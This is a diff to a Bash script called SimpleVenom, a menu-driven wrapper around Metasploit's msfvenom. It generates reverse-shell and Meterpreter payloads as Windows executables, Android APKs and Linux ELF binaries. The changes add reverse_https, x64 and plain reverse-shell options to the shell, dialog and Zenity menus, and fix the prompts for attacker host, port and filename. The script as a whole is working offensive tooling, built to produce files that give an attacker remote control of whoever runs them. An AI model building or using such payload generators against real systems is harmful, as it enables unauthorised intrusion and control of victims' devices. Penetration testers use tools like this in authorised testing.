@@ -3,15 +3,17 @@
 # SimpleVenom - Metasploit Payload Generator Wrapper
 # Refactored Version
 # Authors: ByCh4n & lazypwny
-# Version: 2.1
+# Version: 2.0.0
 
 # ----------------------------
 # Configuration & Global Vars
 # ----------------------------
 readonly VERSION="2.0.0"
+# shellcheck disable=SC2155
 readonly DEFAULT_LHOST=$(hostname -I 2>/dev/null | awk '{print $1}')
 readonly DEFAULT_LPORT="4444"
 readonly DEFAULT_NAME="payload"
+# shellcheck disable=SC2155
 readonly CWD=$(pwd)
 
 # Colors for Shell Mode
@@ -72,6 +74,11 @@ generate_payload_cmd() {
     local filename="$5"
     local extension="$6"
 
+    # Extension Check: If filename already ends with extension, strip it first.
+    if [[ "$filename" == *."$extension" ]]; then
+        filename="${filename%."$extension"}"
+    fi
+
     local outfile="${CWD}/${filename}.${extension}"
     
     # Ensure cleanup before generating new payload
@@ -127,18 +134,22 @@ run_shell_mode() {
     if [[ "$platform" == "Windows" ]]; then
         echo "1) windows/meterpreter/reverse_tcp"
         echo "2) windows/meterpreter/reverse_http"
-        options=("windows/meterpreter/reverse_tcp" "windows/meterpreter/reverse_http")
+        echo "3) windows/meterpreter/reverse_https"
+        echo "4) windows/x64/meterpreter/reverse_tcp"
+        options=("windows/meterpreter/reverse_tcp" "windows/meterpreter/reverse_http" "windows/meterpreter/reverse_https" "windows/x64/meterpreter/reverse_tcp")
     elif [[ "$platform" == "Android" ]]; then
         echo "1) android/meterpreter/reverse_tcp"
         echo "2) android/meterpreter/reverse_http"
-        options=("android/meterpreter/reverse_tcp" "android/meterpreter/reverse_http")
+        echo "3) android/meterpreter/reverse_https"
+        options=("android/meterpreter/reverse_tcp" "android/meterpreter/reverse_http" "android/meterpreter/reverse_https")
     elif [[ "$platform" == "Linux" ]]; then
         echo "1) linux/x86/meterpreter/reverse_tcp"
         echo "2) linux/x64/meterpreter/reverse_tcp"
-        options=("linux/x86/meterpreter/reverse_tcp" "linux/x64/meterpreter/reverse_tcp")
+        echo "3) linux/x64/shell/reverse_tcp"
+        options=("linux/x86/meterpreter/reverse_tcp" "linux/x64/meterpreter/reverse_tcp" "linux/x64/shell/reverse_tcp")
     fi
     # shellcheck disable=SC2162
-    read -p "Choice [1-2]: " pay_choice
+    read -p "Choice [1-${#options[@]}]: " pay_choice
     local idx=$((pay_choice-1))
     local payload="${options[$idx]}"
 
@@ -182,21 +193,41 @@ run_dialog_mode() {
     if [ $exit_status -ne 0 ]; then exit 0; fi
 
     case "$PLATFORM" in
-        1) P_NAME="Windows"; EXT="exe"; P_LIST="windows/meterpreter/reverse_tcp 1 windows/meterpreter/reverse_http 2" ;;
-        2) P_NAME="Android"; EXT="apk"; P_LIST="android/meterpreter/reverse_tcp 1 android/meterpreter/reverse_http 2" ;;
-        3) P_NAME="Linux"; EXT="elf"; P_LIST="linux/x86/meterpreter/reverse_tcp 1 linux/x64/meterpreter/reverse_tcp 2" ;;
+        1) P_NAME="Windows"; EXT="exe"; P_LIST="windows/meterpreter/reverse_tcp 1 windows/meterpreter/reverse_http 2 windows/meterpreter/reverse_https 3 windows/x64/meterpreter/reverse_tcp 4" ;;
+        2) P_NAME="Android"; EXT="apk"; P_LIST="android/meterpreter/reverse_tcp 1 android/meterpreter/reverse_http 2 android/meterpreter/reverse_https 3" ;;
+        3) P_NAME="Linux"; EXT="elf"; P_LIST="linux/x86/meterpreter/reverse_tcp 1 linux/x64/meterpreter/reverse_tcp 2 linux/x64/shell/reverse_tcp 3" ;;
     esac
 
     # Payload
-    PAYLOAD_TAG=$(dialog --menu "Select Payload for $P_NAME" 12 60 4 $P_LIST 2>&1 1>&3)
+    # shellcheck disable=SC2086
+    PAYLOAD_TAG=$(dialog --menu "Select Payload for $P_NAME" 12 70 4 $P_LIST 2>&1 1>&3)
     # shellcheck disable=SC2181
     if [ $? -ne 0 ]; then exit 0; fi
 
     local PAYLOAD
     case "$P_NAME" in
-        "Windows") if [ "$PAYLOAD_TAG" = "1" ]; then PAYLOAD="windows/meterpreter/reverse_tcp"; else PAYLOAD="windows/meterpreter/reverse_http"; fi ;;
-        "Android") if [ "$PAYLOAD_TAG" = "1" ]; then PAYLOAD="android/meterpreter/reverse_tcp"; else PAYLOAD="android/meterpreter/reverse_http"; fi ;;
-        "Linux") if [ "$PAYLOAD_TAG" = "1" ]; then PAYLOAD="linux/x86/meterpreter/reverse_tcp"; else PAYLOAD="linux/x64/meterpreter/reverse_tcp"; fi ;;
+        "Windows") 
+            case "$PAYLOAD_TAG" in
+                1) PAYLOAD="windows/meterpreter/reverse_tcp" ;;
+                2) PAYLOAD="windows/meterpreter/reverse_http" ;;
+                3) PAYLOAD="windows/meterpreter/reverse_https" ;;
+                4) PAYLOAD="windows/x64/meterpreter/reverse_tcp" ;;
+            esac
+            ;;
+        "Android")
+            case "$PAYLOAD_TAG" in
+                1) PAYLOAD="android/meterpreter/reverse_tcp" ;;
+                2) PAYLOAD="android/meterpreter/reverse_http" ;;
+                3) PAYLOAD="android/meterpreter/reverse_https" ;;
+            esac
+            ;;
+        "Linux")
+            case "$PAYLOAD_TAG" in
+                1) PAYLOAD="linux/x86/meterpreter/reverse_tcp" ;;
+                2) PAYLOAD="linux/x64/meterpreter/reverse_tcp" ;;
+                3) PAYLOAD="linux/x64/shell/reverse_tcp" ;;
+            esac
+            ;;
     esac
 
     # Settings Form
@@ -260,39 +291,48 @@ run_zenity_mode() {
         "Windows") 
             EXT="exe"
             PAYLOAD=$(zenity --list --text="Select Payload" --radiolist --column="Pick" --column="Payload" \
-                TRUE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_http")
+                TRUE "windows/meterpreter/reverse_tcp" \
+                FALSE "windows/meterpreter/reverse_http" \
+                FALSE "windows/meterpreter/reverse_https" \
+                FALSE "windows/x64/meterpreter/reverse_tcp")
             ;;
         "Android") 
             EXT="apk"
             PAYLOAD=$(zenity --list --text="Select Payload" --radiolist --column="Pick" --column="Payload" \
-                TRUE "android/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_http")
+                TRUE "android/meterpreter/reverse_tcp" \
+                FALSE "android/meterpreter/reverse_http" \
+                FALSE "android/meterpreter/reverse_https")
             ;;
         "Linux") 
             EXT="elf"
             PAYLOAD=$(zenity --list --text="Select Payload" --radiolist --column="Pick" --column="Payload" \
-                TRUE "linux/x86/meterpreter/reverse_tcp" FALSE "linux/x64/meterpreter/reverse_tcp")
+                TRUE "linux/x86/meterpreter/reverse_tcp" \
+                FALSE "linux/x64/meterpreter/reverse_tcp" \
+                FALSE "linux/x64/shell/reverse_tcp")
             ;;
     esac
 
     if [[ -z "$PAYLOAD" ]]; then exit 0; fi
 
     # Settings
-    SETTINGS=$(zenity --forms --title="Payload Config" --text="Settings for $PAYLOAD\n(Leave blank to use defaults)" \
-        --add-entry="LHOST (Def: $DEFAULT_LHOST)" \
-        --add-entry="LPORT (Def: $DEFAULT_LPORT)" \
-        --add-entry="Filename (Def: $DEFAULT_NAME)" \
-        --separator="|")
-    
-    if [[ -z "$SETTINGS" ]]; then exit 0; fi
+    # Zenity forms do NOT support pre-filled values. 
+    # To satisfy the requirement of having values pre-filled in input boxes,
+    # we must switch to sequential "entry" dialogs.
 
     local LHOST
     local LPORT
     local FNAME
-    LHOST=$(echo "$SETTINGS" | cut -d'|' -f1)
-    LPORT=$(echo "$SETTINGS" | cut -d'|' -f2)
-    FNAME=$(echo "$SETTINGS" | cut -d'|' -f3)
 
-    # Defaults if empty
+    # 1. LHOST
+    if ! LHOST=$(zenity --entry --title="Payload Config (1/3)" --text="Enter LHOST:" --entry-text="$DEFAULT_LHOST"); then exit 0; fi
+    
+    # 2. LPORT
+    if ! LPORT=$(zenity --entry --title="Payload Config (2/3)" --text="Enter LPORT:" --entry-text="$DEFAULT_LPORT"); then exit 0; fi
+
+    # 3. Filename
+    if ! FNAME=$(zenity --entry --title="Payload Config (3/3)" --text="Enter Filename (no extension):" --entry-text="$DEFAULT_NAME"); then exit 0; fi
+
+    # Defaults if empty (just in case user cleared them)
     LHOST=${LHOST:-$DEFAULT_LHOST}
     LPORT=${LPORT:-$DEFAULT_LPORT}
     FNAME=${FNAME:-$DEFAULT_NAME}
